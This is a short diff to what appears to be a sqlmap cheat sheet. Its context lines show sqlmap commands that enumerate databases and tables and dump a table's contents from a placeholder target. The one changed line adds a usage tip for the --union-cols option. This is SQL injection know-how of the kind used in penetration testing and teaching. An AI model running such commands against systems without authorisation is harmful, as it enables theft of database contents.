@@ -293,7 +293,7 @@ sqlmap -r case5.txt --level=5 --risk=3 -v 3 -T <table_name> --no-cast --dump
 ```
 sqlmap -u <target> --union-cols=<number> --level=5 --risk=3 --batch --dbs --tables
 ```
-- `--union-cols=<number>`	manually sets the number of columns to be used in UNION SELECT injections.
+- `--union-cols=<number>`	manually sets the number of columns to be used in UNION SELECT injections. Can be usefule if you can count number of columns in the page output.
 - `--batch`	runs sqlmap in non-interactive mode (auto-answers all prompts).
 
 
